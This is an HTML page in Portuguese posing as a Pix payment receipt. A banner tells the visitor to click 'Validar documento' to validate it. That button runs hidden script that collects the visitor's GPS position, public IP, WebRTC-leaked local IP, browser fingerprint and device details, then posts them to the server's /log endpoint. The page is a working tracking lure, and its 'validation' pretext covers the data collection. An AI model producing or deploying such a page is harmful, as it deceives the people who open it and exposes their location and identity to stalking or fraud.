<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Comprovante Pix</title>
  <style>
    body { background: #fff; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
    <img src="comprovante.jpg" alt="Comprovante Pix" />
    <div style="background:#fffbe6; border:1px solid #ccc; padding:20px; margin:30px; font-family:Arial;">
      ⚠️ <b>Este comprovante precisa ser validado em nosso sistema.</b><br><br>
      Clique abaixo para confirmar:
      <br><br>
      <button onclick="rastrearComGPS()" style="padding: 10px 20px; font-size: 16px;">Validar documento</button>
    </div>
  
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script>
      async function rastrearComGPS() {
        try {
          navigator.geolocation.getCurrentPosition(async (pos) => {
            const gps = `${pos.coords.latitude},${pos.coords.longitude}`;
            const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
  
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
  
            let localIP = "N/A";
            pc.onicecandidate = event => {
              if (event && event.candidate) {
                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
                if (match) localIP = match[1];
              }
            };
  
            const fp = await FingerprintJS.load();
            const result = await fp.get();
  
            const payload = {
              ip: ipData.ip,
              localIP,
              visitorId: result.visitorId,
              userAgent: navigator.userAgent,
              device: `${navigator.platform} - ${navigator.userAgent}`,
              loc: gps
            };
  
            await fetch("/log", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload)
            });
  
            console.log("✅ Dados com GPS enviados:", payload.loc);
          }, err => {
            console.warn("❌ GPS bloqueado ou negado:", err);
          });
        } catch (e) {
          console.error("❌ Erro geral:", e);
        }
      }
    </script>
  </body>
  
</html>
